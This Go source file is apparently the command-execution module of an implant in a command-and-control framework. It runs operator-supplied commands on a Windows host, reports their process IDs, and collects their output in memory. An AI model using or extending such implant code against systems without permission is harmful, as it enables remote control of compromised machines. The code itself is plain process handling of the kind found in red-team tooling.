//go:build implant && (!lp || !teamserver)

package firecollect

import (
	"bytes"
	"errors" // For returning new errors
	"fmt"    // For fmt.Errorf
	"io"
	"log"
	"os"
	"os/exec"
	"shlyuz/pkg/component"
	"strings" // For strings.Split
	"sync"    // For coordinating reader goroutine
)

// Execute runs the command specified by cmdDetails and collects its standard output in-memory.
// Standard error is captured and returned as part of an error if the command fails.
func Execute(cmdDetails component.Command, execChannels *component.ComponentExecutionChannel) (string, error) {
	log.Printf("CmdID %s (Windows): Preparing to execute and collect output for: %s", cmdDetails.Id, cmdDetails.Args)

	cmdArgs := strings.Split(cmdDetails.Args, " ")
	command := exec.Command(cmdArgs[0], cmdArgs[1:]...)
	// Note: For Windows, if cmdDetails.Type == "Shell", one might typically use exec.Command("cmd", "/C", cmdDetails.Args).
	// However, to maintain consistency with the Linux version's direct arg splitting,
	// we'll assume cmdDetails.Args is already structured appropriately for direct execution,
	// or the caller pre-formats it (e.g. "cmd", "/C", "your_command").

	// Create an in-memory pipe for stdout
	r, w, err := os.Pipe()
	if err != nil {
		log.Printf("CmdID %s (Windows): Error creating stdout pipe: %v", cmdDetails.Id, err)
		return "", fmt.Errorf("failed to create stdout pipe for cmd %s: %w", cmdDetails.Id, err)
	}
	command.Stdout = w

	// Capture stderr in a buffer
	var stderrBuf bytes.Buffer
	command.Stderr = &stderrBuf

	// Goroutine to read from the pipe's reader end
	var outputBuf bytes.Buffer
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer r.Close() // Close reader end when done
		log.Printf("CmdID %s (Windows): Starting to read from stdout pipe.", cmdDetails.Id)
		if _, copyErr := io.Copy(&outputBuf, r); copyErr != nil {
			log.Printf("CmdID %s (Windows): Error copying stdout from pipe: %v", cmdDetails.Id, copyErr)
		}
		log.Printf("CmdID %s (Windows): Finished reading from stdout pipe.", cmdDetails.Id)
	}()

	// Start the command
	if err := command.Start(); err != nil {
		log.Printf("CmdID %s (Windows): Error starting command: %v", cmdDetails.Id, err)
		_ = w.Close() // Best effort to close
		_ = r.Close() // Best effort to close
		// Not waiting for wg here as Start failed, goroutine might not have run or could be stuck.
		return "", fmt.Errorf("failed to start command %s: %w. Stderr: %s", cmdDetails.Id, err, stderrBuf.String())
	}
	log.Printf("CmdID %s (Windows): Command started successfully (PID: %d).", cmdDetails.Id, command.Process.Pid)
	if execChannels != nil && execChannels.Pid != nil {
		select {
		case execChannels.Pid <- command.Process.Pid:
		default:
			log.Printf("CmdID %s (Windows): PID channel full, dropping PID for command %s", cmdDetails.Id, cmdDetails.Args)
		}
	}

	// Close the writer end of the pipe. The command has its own copy of the fd.
	// This is crucial so that the reader goroutine sees EOF when the command finishes writing.
	if err := w.Close(); err != nil {
		log.Printf("CmdID %s (Windows): Error closing command's stdout pipe writer: %v", cmdDetails.Id, err)
		// This is not necessarily fatal for command execution but might affect output collection.
	}

	// Wait for the command to finish
	waitErr := command.Wait()

	// Wait for the reader goroutine to finish processing all output.
	// This must happen AFTER command.Wait() to ensure all output is flushed
	// from the command's internal buffers and the pipe is broken from the writer side.
	wg.Wait()

	if waitErr != nil {
		log.Printf("CmdID %s (Windows): Command finished with error: %v. Stderr: %s", cmdDetails.Id, waitErr, stderrBuf.String())
		// Include stderr in the error message if available
		errMsg := fmt.Sprintf("command %s finished with error: %v", cmdDetails.Id, waitErr)
		if stderrBuf.Len() > 0 {
			errMsg = fmt.Sprintf("%s. Stderr: %s", errMsg, stderrBuf.String())
		}
		return outputBuf.String(), errors.New(errMsg) // Return collected output along with error
	}

	log.Printf("CmdID %s (Windows): Command finished successfully. Collected %d bytes of output.", cmdDetails.Id, outputBuf.Len())
	return outputBuf.String(), nil
}
